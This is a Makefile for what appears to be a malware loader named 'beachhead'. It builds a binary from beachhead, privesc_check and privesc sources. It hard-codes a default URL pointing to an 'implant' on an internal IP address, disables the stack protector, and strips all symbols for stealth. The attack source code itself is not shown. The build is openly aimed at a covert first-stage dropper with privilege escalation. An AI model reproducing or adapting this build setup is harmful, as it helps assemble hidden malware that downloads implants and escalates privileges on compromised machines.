# Beachhead Makefile (Stealth-Enhanced)
URL ?= "http://10.37.1.249/implant"

CXX = g++
CXXFLAGS = -O3 -s -Wall -Wextra -fno-stack-protector \
           -ffunction-sections -fdata-sections -DURL='$(URL)'
LDFLAGS = -Wl,--gc-sections

TARGET = beachhead
SRCS = beachhead.cpp privesc_check.cpp privesc.cpp
OBJS = $(SRCS:.cpp=.o)

all: $(TARGET)

$(TARGET): $(OBJS)
	$(CXX) $(CXXFLAGS) -o $(TARGET) $(OBJS) $(LDFLAGS)
	strip --strip-all $(TARGET)

debug: CXXFLAGS = -O0 -g -DDEBUG -DURL='$(URL)'
debug: clean $(TARGET)
	@echo "[+] Debug build complete (symbols retained, logging enabled)"

%.o: %.cpp privesc_check.h privesc.h
	$(CXX) $(CXXFLAGS) -c $< -o $@

clean:
	rm -f $(TARGET) $(OBJS)

.PHONY: all clean debug
